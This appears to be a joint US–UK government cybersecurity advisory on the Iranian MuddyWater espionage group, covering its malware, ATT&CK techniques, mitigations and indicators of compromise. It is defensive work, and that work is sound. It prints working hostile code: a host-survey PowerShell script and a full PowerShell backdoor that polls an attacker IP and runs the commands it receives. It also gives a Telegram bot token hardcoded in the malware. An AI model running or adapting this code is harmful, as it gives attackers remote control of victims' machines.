{
  "markdown": "\n\nSummary\n\nActions to Take Today to Protect Against Malicious Activity\n* Search for indicators of compromise.\n* Use antivirus software.\n* Patch all systems.\n* Prioritize patching known exploited vulnerabilities.\n* Train users to recognize and report phishing attempts.\n* Use multi-factor authentication.\nNote: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u00ae) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.\nThe Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), and the United Kingdom\u2019s National Cyber Security Centre (NCSC-UK) have observed a group of Iranian government-sponsored advanced persistent threat (APT) actors, known as MuddyWater, conducting cyber espionage and other malicious cyber operations targeting a range of government and private-sector organizations across sectors\u2014including telecommunications, defense, local government, and oil and natural gas\u2014in Asia, Africa, Europe, and North America. Note: MuddyWater is also known as Earth Vetala, MERCURY, Static Kitten, Seedworm, and TEMP.Zagros.\nMuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security (MOIS).[1] This APT group has conducted broad cyber campaigns in support of MOIS objectives since approximately 2018. MuddyWater actors are positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors.\nMuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools and strategies to gain access to sensitive data on victims\u2019 systems and deploy ransomware. These actors also maintain persistence on victim networks via tactics such as side-loading dynamic link libraries (DLLs)\u2014to trick legitimate programs into running malware\u2014and obfuscating PowerShell scripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed MuddyWater actors recently using various malware\u2014variants of PowGoop, Small Sieve, Canopy (also known as Starwhale), Mori, and POWERSTATS\u2014along with other tools as part of their malicious activity.\u00a0\nThis advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators of compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid organizations in the identification of malicious activity against sensitive networks.\u00a0\nFBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations apply the mitigations in this advisory and review the following resources for additional information. Note: also see the Additional Resources section.\n\nMalware Analysis Report \u2013 MAR-10369127-1.v1: MuddyWater\nIOCs \u2013 AA22-052A.stix and MAR-10369127-1.v1.stix\nCISA's webpage \u2013 Iran Cyber Threat Overview and Advisories\nNCSC-UK MAR\u00a0\u2013 Small Sieve\nCNMF's press release \u2013 Iranian intel cyber suite of malware uses open source tools\n\nClick here for a PDF version of this report.\n\nTechnical Details\n\nFBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open-source tools to gain access to sensitive government and commercial networks.\u00a0\nAs part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor\u2019s C2 server or a PDF file that drops a malicious file to the victim\u2019s network [T1566.001, T1204.002]. MuddyWater actors also use techniques such as side-loading DLLs [T1574.002] to trick legitimate programs into running malware and obfuscating PowerShell scripts [T1059.001] to hide C2 functions [T1027] (see the PowGoop section for more information).\u00a0\nAdditionally, the group uses multiple malware sets\u2014including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS\u2014for loading malware, backdoor access, persistence [TA0003], and exfiltration [TA0010]. See below for descriptions of some of these malware sets, including newer tools or variants to the group\u2019s suite. Additionally, see Malware Analysis Report MAR-10369127.r1.v1: MuddyWater for further details.\nPowGoop\nMuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file impersonates a legitimate file that is signed as a Google Update executable file.\nAccording to samples of PowGoop analyzed by CISA and CNMF, PowGoop consists of three components:\n\nA DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading technique [T1574.002]. The DLL file is contained within an executable, GoogleUpdate.exe.\u00a0\nA PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a second obfuscated PowerShell script, config.txt [T1059.001].\nconfig.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.\n\nThese components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service.\u00a0\nSmall Sieve\nAccording to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor distributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS installs the Python backdoor, index.exe, and adds it as a registry run key [T1547.001], enabling persistence [TA0003].\u00a0\nMuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated with Small Sieve [T1036.005].\nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid detection [TA0005] by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface (API). Specifically, Small Sieve\u2019s beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure (HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a hex byte swapping encoding scheme combined with an obfuscated Base64 function [T1027], T1132.002].\nNote: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with high confidence.\u00a0\nSee Appendix B for further analysis of Small Sieve malware.\nCanopy\nMuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments [T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the cybersecurity agencies of the United Kingdom and the United States attribute these malware samples to MuddyWater with high confidence.\u00a0\nIn the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros [T1204.002]. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.\nThe first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file contains hexadecimal (hex)-encoded strings that have been reshuffled [T1027]. The file executes a command to run the second .wsf.\nThe second .wsf also contains hex-encoded strings that have been reshuffled. This file collects [TA0035] the victim system\u2019s IP address, computer name, and username [T1005]. The collected data is then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124, via an HTTP POST request [T1041].\nMori\nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group\u2019s C2 infrastructure [T1572].\u00a0\nAccording to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component to another program. FML.dll contains approximately 200MB of junk data [T1001.001] in a resource directory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs the following tasks:\n\nDeletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with a .old extension.\nResolves networking APIs from strings that are ADD-encrypted with the key 0x05.\nUses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.\nCommunicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2 [T1071.001].\nReads and/or writes data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\(Default).\n\nPOWERSTATS\nThis group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems [T1059.001].\u00a0\nCNMF has posted samples further detailing the different parts of MuddyWater\u2019s new suite of tools\u2014 along with JavaScript files used to establish connections back to malicious infrastructure\u2014to the malware aggregation tool and repository, Virus Total. Network operators who identify multiple instances of the tools on the same network should investigate further as this may indicate the presence of an Iranian malicious cyber actor.\nMuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688). See CISA\u2019s Known Exploited Vulnerabilities Catalog for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities for additional Iranian APT group-specific vulnerability exploits.\nSurvey Script\nThe following script is an example of a survey script used by MuddyWater to enumerate information about victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain information about the compromised machine to generate a string, with these fields separated by a delimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant and sent to an adversary-controlled IP address.\n$O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += \";;\";$ips = \"\";Get-WmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips = $ips + \", \" + $_.IPAddress[0]};$S += $ips.substring(1);$S += \";;\";$S += $O.OSArchitecture;$S += \";;\";$S += [System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get-WmiObject Win32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S += \";;\";$AntiVirusProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct \u00a0-ComputerName $env:computername;$resAnti = @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti += $AntiVirusProduct.displayName};$S += $resAnti;echo $S;\nNewly Identified PowerShell Backdoor\nThe newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-OR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.\nfunction encode($txt,$key){$enByte = [Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt = [Convert]::ToBase64String($enByte);return $encodetxt;}function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt = [System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;}$global:tt=20;while($true){try{$w = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.Length -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode $r 2));$wr = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$wr.proxy = [Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res 2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds $global:tt;}\nMITRE ATT&CK Techniques\nMuddyWater uses the ATT&CK techniques listed in table 1.\nTable 1: MuddyWater ATT&CK Techniques[2]\n\n\n\nTechnique Title\nID\nUse\n\n\n\n\nReconnaissance\n\n\nGather Victim Identity Information: Email Addresses\nT1589.002\nMuddyWater has specifically targeted government agency employees with spearphishing emails.\n\n\nResource Development\n\n\nAcquire Infrastructure: Web Services\nT1583.006\nMuddyWater has used file sharing services including OneHub to distribute tools.\n\n\nObtain Capabilities: Tool\nT1588.002\nMuddyWater has made use of legitimate tools ConnectWise and RemoteUtilities for access to target environments.\n\n\nInitial Access\n\n\nPhishing: Spearphishing Attachment\nT1566.001\nMuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments.\u00a0\n\n\nPhishing: Spearphishing Link\nT1566.002\nMuddyWater has sent targeted spearphishing emails with malicious links.\n\n\nExecution\n\n\nWindows Management Instrumentation\nT1047\nMuddyWater has used malware that leveraged Windows Management Instrumentation for execution and querying host information.\n\n\nCommand and Scripting Interpreter: PowerShell\nT1059.001\nMuddyWater has used PowerShell for execution.\n\n\nCommand and Scripting Interpreter: Windows Command Shell\n1059.003\nMuddyWater has used a custom tool for creating reverse shells.\n\n\nCommand and Scripting Interpreter: Visual Basic\nT1059.005\nMuddyWater has used Virtual Basic Script (VBS) files to execute its POWERSTATS payload, as well as macros.\n\n\nCommand and Scripting Interpreter: Python\nT1059.006\nMuddyWater has used developed tools in Python including Out1.\u00a0\n\n\nCommand and Scripting Interpreter: JavaScript\nT1059.007\nMuddyWater has used JavaScript files to execute its POWERSTATS payload.\n\n\nExploitation for Client Execution\nT1203\nMuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.\n\n\nUser Execution: Malicious Link\nT1204.001\nMuddyWater has distributed URLs in phishing emails that link to lure documents.\n\n\nUser Execution: Malicious File\nT1204.002\nMuddyWater has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.\n\n\nInter-Process Communication: Component Object Model\nT1559.001\nMuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.\n\n\nInter-Process Communication: Dynamic Data Exchange\nT1559.002\nMuddyWater has used malware that can execute PowerShell scripts via Dynamic Data Exchange.\n\n\nPersistence\n\n\nScheduled Task/Job: Scheduled Task\nT1053.005\nMuddyWater has used scheduled tasks to establish persistence.\n\n\nOffice Application Startup: Office Template Macros\nT1137.001\nMuddyWater has used a Word Template, Normal.dotm, for persistence.\n\n\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder\nT1547.001\nMuddyWater has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence.\u00a0\n\n\nPrivilege Escalation\n\n\nAbuse Elevation Control Mechanism: Bypass User Account Control\u00a0\nT1548.002\nMuddyWater uses various techniques to bypass user account control.\n\n\nCredentials from Password Stores\nT1555\nMuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.\n\n\nCredentials from Web Browsers\n\nT1555.003\n\nMuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.\n\n\nDefense Evasion\n\n\nObfuscated Files or Information\nT1027\nMuddyWater has used Daniel Bohannon\u2019s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.\n\n\nSteganography\nT1027.003\nMuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.\n\n\nCompile After Delivery\nT1027.004\nMuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.\n\n\nMasquerading: Match Legitimate Name or Location\nT1036.005\nMuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender. E.g., Small Sieve uses variations of Microsoft (Microsift) and Outlook in its filenames to attempt to avoid detection during casual inspection.\n\n\nDeobfuscate/Decode Files or Information\n\nT1140\n\nMuddyWater decoded Base64-encoded PowerShell commands using a VBS file.\n\n\nSigned Binary Proxy Execution: CMSTP\n\nT1218.003\n\nMuddyWater has used CMSTP.exe and a malicious .INF file to execute its POWERSTATS payload.\n\n\nSigned Binary Proxy Execution: Mshta\nT1218.005\nMuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.\n\n\nSigned Binary Proxy Execution: Rundll32\nT1218.011\nMuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.\n\n\nExecution Guardrails\nT1480\nThe Small Sieve payload used by MuddyWater will only execute correctly if the word \u201cPlatypus\u201d is passed to it on the command line.\n\n\nImpair Defenses: Disable or Modify Tools\nT1562.001\nMuddyWater can disable the system's local proxy settings.\n\n\nCredential Access\n\n\nOS Credential Dumping: LSASS Memory\nT1003.001\nMuddyWater has performed credential dumping with Mimikatz and procdump64.exe.\n\n\nOS Credential Dumping: LSA Secrets\n\nT1003.004\n\nMuddyWater has performed credential dumping with LaZagne.\n\n\nOS Credential Dumping: Cached Domain Credentials\nT1003.005\nMuddyWater has performed credential dumping with LaZagne.\n\n\nUnsecured Credentials: Credentials In Files\n\nT1552.001\n\nMuddyWater has run a tool that steals passwords saved in victim email.\n\n\nDiscovery\u00a0\n\n\nSystem Network Configuration Discovery\nT1016\nMuddyWater has used malware to collect the victim\u2019s IP address and domain name.\n\n\nSystem Owner/User Discovery\nT1033\nMuddyWater has used malware that can collect the victim\u2019s username.\n\n\nSystem Network Connections Discovery\nT1049\nMuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.\n\n\nProcess Discovery\nT1057\nMuddyWater has used malware to obtain a list of running processes on the system.\n\n\nSystem Information Discovery\n\nT1082\n\nMuddyWater has used malware that can collect the victim\u2019s OS version and machine name.\n\n\nFile and Directory Discovery\nT1083\nMuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"\n\n\nAccount Discovery: Domain Account\nT1087.002\nMuddyWater has used cmd.exe net user/domain to enumerate domain users.\n\n\nSoftware Discovery\nT1518\nMuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.\n\n\nSecurity Software Discovery\nT1518.001\nMuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.\n\n\nCollection\n\n\nScreen Capture\nT1113\nMuddyWater has used malware that can capture screenshots of the victim\u2019s machine.\n\n\n\nArchive Collected Data: Archive via Utility\n\nT1560.001\nMuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.\n\n\nCommand and Control\n\n\nApplication Layer Protocol: Web Protocols\nT1071.001\nMuddyWater has used HTTP for C2 communications. e.g., Small Sieve beacons and tasking are performed using the Telegram API over HTTPS.\n\n\nProxy: External Proxy\nT1090.002\n\nMuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location.\u00a0\nMuddyWater has used a series of compromised websites that victims connected to randomly to relay information to C2.\n\n\n\nWeb Service: Bidirectional Communication\nT1102.002\nMuddyWater has used web services including OneHub to distribute remote access tools.\n\n\nMulti-Stage Channels\nT1104\nMuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.\n\n\nIngress Tool Transfer\nT1105\nMuddyWater has used malware that can upload additional files to the victim\u2019s machine.\n\n\nData Encoding: Standard Encoding\nT1132.001\nMuddyWater has used tools to encode C2 communications including Base64 encoding.\n\n\nData Encoding: Non-Standard Encoding\nT1132.002\nMuddyWater uses tools such as Small Sieve, which employs a custom hex byte swapping encoding scheme to obfuscate tasking traffic.\n\n\nRemote Access Software\n\u00a0T1219\nMuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally.\n\n\nExfiltration\n\n\nExfiltration Over C2 Channel\nT1041\nMuddyWater has used C2 infrastructure to receive exfiltrated data.\n\n\n\n\u00a0\n\nMitigations\n\nProtective Controls and Architecture\n\nDeploy application control software to limit the applications and executable code that can be run by users. Email attachments and files downloaded via links in emails often contain executable code.\u00a0\n\nIdentity and Access Management\n\nUse multifactor authentication where possible, particularly for webmail, virtual private networks, and accounts that access critical systems.\u00a0\nLimit the use of administrator privileges. Users who browse the internet, use email, and execute code with administrator privileges make for excellent spearphishing targets because their system\u2014once infected\u2014enables attackers to move laterally across the network, gain additional accesses, and access highly sensitive information.\u00a0\n\nPhishing Protection\n\nEnable antivirus and anti-malware software and update signature definitions in a timely manner. Well-maintained antivirus software may prevent use of commonly deployed attacker tools that are delivered via spearphishing.\u00a0\nBe suspicious of unsolicited contact via email or social media from any individual you do not know personally. Do not click on hyperlinks or open attachments in these communications.\nConsider adding an email banner to emails received from outside your organization and disabling hyperlinks in received emails.\nTrain users through awareness and simulations to recognize and report phishing and social engineering attempts. Identify and suspend access of user accounts exhibiting unusual activity.\nAdopt threat reputation services at the network device, operating system, application, and email service levels. Reputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP addresses used in spearphishing attacks.\u00a0\n\nVulnerability and Configuration Management\n\nInstall updates/patch operating systems, software, and firmware as soon as updates/patches are released. Prioritize patching known exploited vulnerabilities.\n\nAdditional Resources\n\nFor more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage \u2013 Iran Cyber Threat Overview and Advisories and CNMF's press release \u2013 Iranian intel cyber suite of malware uses open source tools.\u00a0\nFor information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.\nThe joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.\nCISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.\nThe U.S. Department of State\u2019s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.\n\nReferences\n[1] CNMF Article: Iranian Intel Cyber Suite of Malware Uses Open Source Tools\n[2] MITRE ATT&CK: MuddyWater\u00a0\nCaveats\nThe information you have accessed or received is being provided \u201cas is\u201d for informational purposes only. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the FBI, CISA, CNMF, or NSA.\nPurpose\nThis document was developed by the FBI, CISA, CNMF, NCSC-UK, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. The United States\u2019 NSA agrees with this attribution and the details provided in this report.\nAppendix A: IOCs\nThe following IP addresses are associated with MuddyWater activity:\n5.199.133[.]149\n45.142.213[.]17\u00a0\u00a0 \u00a0\n45.142.212[.]61\n45.153.231[.]104\u00a0\n46.166.129[.]159\u00a0\n80.85.158[.]49\u00a0\n87.236.212[.]22\n88.119.170[.]124\u00a0\n88.119.171[.]213\n89.163.252[.]232\n95.181.161[.]49\n95.181.161[.]50\n164.132.237[.]65\n185.25.51[.]108\n185.45.192[.]228\u00a0\n185.117.75[.]34\n185.118.164[.]21\n185.141.27[.]143\n185.141.27[.]248\u00a0\n185.183.96[.]7\n185.183.96[.]44\n192.210.191[.]188\n192.210.226[.]128\nAppendix B: Small Sieve\nNote: the information contained in this appendix is from NCSC-UK analysis of a Small Sieve sample.\nMetadata\nTable 2: Gram.app.exe Metadata\n\n\n\nFilename\ngram_app.exe\u00a0\n\n\n\n\nDescription\nNSIS installer that installs and runs the index.exe backdoor and adds a persistence registry key\u00a0\n\n\nSize\n16999598 bytes\u00a0\n\n\nMD5\n15fa3b32539d7453a9a85958b77d4c95\u00a0\n\n\nSHA-1\n11d594f3b3cf8525682f6214acb7b7782056d282\u00a0\n\n\nSHA-256\nb75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054\u00a0\n\n\nCompile Time\n2021-09-25 21:57:46 UTC\u00a0\n\n\n\n\u00a0\nTable 3: Index.exe Metadata\n\n\n\nFilename\n\u00a0index.exe\u00a0\n\n\n\n\nDescription\nThe final PyInstaller-bundled Python 3.9 backdoor\u00a0\n\n\nSize\n17263089 bytes\u00a0\n\n\nMD5\n5763530f25ed0ec08fb26a30c04009f1\u00a0\n\n\nSHA-1\n2a6ddf89a8366a262b56a251b00aafaed5321992\u00a0\n\n\nSHA-256\nbf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37d3a2\u00a0\u00a0\n\n\nCompile Time\n2021-08-01 04:39:46 UTC\u00a0\n\n\n\n\u00a0\nFunctionality\u00a0\nInstallation\u00a0\nSmall Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe, which does not appear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe is installed in the user\u2019s AppData/Roaming directory and is added as a Run key in the registry to enabled persistence after reboot.\u00a0\nThe installer then executes the backdoor with the \u201cPlatypus\u201d argument [T1480], which is also present in the registry persistence key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift.\u00a0\nConfiguration\u00a0\nThe backdoor attempts to restore previously initialized session data from %LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt.\u00a0\nIf this file does not exist, then it uses the hardcoded values listed in table 4:\nTable 4: Credentials and Session Values\n\n\n\nField\u00a0\nValue\nDescription\n\n\n\n\nChat ID\n2090761833\u00a0\nThis is the Telegram Channel ID that beacons are sent to, and, from which, tasking requests are received. Tasking requests are dropped if they do not come from this channel. This value cannot be changed.\u00a0\n\n\nBot ID\nRandom value between 10,000,000 and 90,000,000\u00a0\nThis is a bot identifier generated at startup that is sent to the C2 in the initial beacon. Commands must be prefixed with /com[Bot ID] in order to be processed by the malware.\n\n\nTelegram Token\u00a0\n2003026094: AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY\u00a0\nThis is the initial token used to authenticate each message to the Telegram Bot API.\n\n\n\n\u00a0\nTasking\u00a0\nSmall Sieve beacons via the Telegram Bot API, sending the configured Bot ID, the currently logged-in user, and the host\u2019s IP address, as described in the Communications (Beacon format) section below. It then waits for tasking as a Telegram bot using the python-telegram-bot module.\u00a0\nTwo task formats are supported:\u00a0\n\n/start \u2013 no argument is passed; this causes the beacon information to be repeated.\u00a0\n/com[BotID] [command] \u2013 for issuing commands passed in the argument.\u00a0\n\nThe following commands are supported by the second of these formats, as described in table 5:\u00a0\nTable 5: Supported Commands\n\n\n\nCommand\nDescription\n\n\n\n\ndelete\u00a0\nThis command causes the backdoor to exit; it does not remove persistence.\u00a0\n\n\ndownload url\u201d\u201dfilename\u00a0\nThe URL will be fetched and saved to the provided filename using the Python urllib module urlretrieve function. \u00a0\n\n\nchange token\u201d\u201dnewtoken\u00a0\nThe backdoor will reconnect to the Telegram Bot API using the provided token newtoken. This updated token will be stored in the encoded MicrosoftWindowsOutlookDataPlus.txt file.\u00a0\n\n\ndisconnect\u00a0\nThe original connection to Telegram is terminated. It is likely used after a change token command is issued.\u00a0\n\n\n\n\u00a0\nAny commands other than those detailed in table 5 are executed directly by passing them to cmd.exe /c, and the output is returned as a reply.\nDefense Evasion\u00a0\nAnti-Sandbox\u00a0\n\nFigure 1: Execution Guardrail\nThreat actors may be attempting to thwart simple analysis by not passing \u201cPlatypus\u201d on the command line.\u00a0\nString obfuscation\u00a0\nInternal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64-encoded. A decryption script is included in Appendix B.\nCommunications\u00a0\nBeacon Format\u00a0\nBefore listening for tasking using CommandHandler objects from the python-telegram-bot\u00a0module, a beacon is generated manually using the standard requests library:\n\nFigure 2: Manually Generated Beacon\nThe hex host data is encoded using the byte shuffling algorithm as described in the \u201cCommunications (Traffic obfuscation)\u201d section of this report. The example in figure 2 decodes to:\u00a0\nadmin/WINDOMAIN1 | 10.17.32.18\n\u00a0\nTraffic obfuscation\u00a0\nAlthough traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and response using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3.\n\u00a0\n\nFigure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling\n\u00a0\nDetection\u00a0\nTable 6 outlines indicators of compromise.\n\u00a0\nTable 6: Indicators of Compromise\n\n\n\nType\nDescription\nValues\n\n\n\n\nPath\nTelegram Session Persistence File (Obfuscated)\u00a0\n%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt\u00a0\n\n\nPath\nInstallation path of the Small Sieve binary\u00a0\n%AppData%\\OutlookMicrosift\\index.exe\u00a0\n\n\nRegistry value name\nPersistence Registry Key pointing to index.exe with a \u201cPlatypus\u201d argument\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift\u00a0\n\n\n\n\u00a0\nString Recover Script\n\nFigure 4: String Recovery Script\n\nContact Information\n\nTo report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI\u2019s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at Cybersecurity_Requests@nsa.gov. United Kingdom organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or for urgent assistance call 03000 200 973.\n\nRevisions\n\nFebruary 24, 2022: Initial Version\n",
  "cves": [
    "CVE-2020-0688",
    "CVE-2020-1472",
    "CVE-2017-0199"
  ],
  "techniques": [
    "T1204.002",
    "T1137.001",
    "T1059.005",
    "T1560.001",
    "T1102.002",
    "T1552.001",
    "T1027.004",
    "T1090.002",
    "T1003.005",
    "T1053.005",
    "T1548.002",
    "T1566.002",
    "T1218.005",
    "T1574.002",
    "T1218.011",
    "T1566.001",
    "T1559.001",
    "T1547.001",
    "T1059.001",
    "T1132.002",
    "T1059.006",
    "T1059.007",
    "T1518.001",
    "T1071.001",
    "T1583.006",
    "T1001.001",
    "T1087.002",
    "T1559.002",
    "T1588.002",
    "T1562.001",
    "T1027.003",
    "T1555.003",
    "T1132.001",
    "T1589.002",
    "T1003.001",
    "T1218.003",
    "T1204.001",
    "T1003.004",
    "T1036.005"
  ],
  "advisory": "aa22-055a",
  "title": "Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks | CISA",
  "source": "cybersecurity-advisories",
  "id": "83849283e20608002ea11b66450b7448ae863b92a15f4a9d86524b53c1d3722c"
}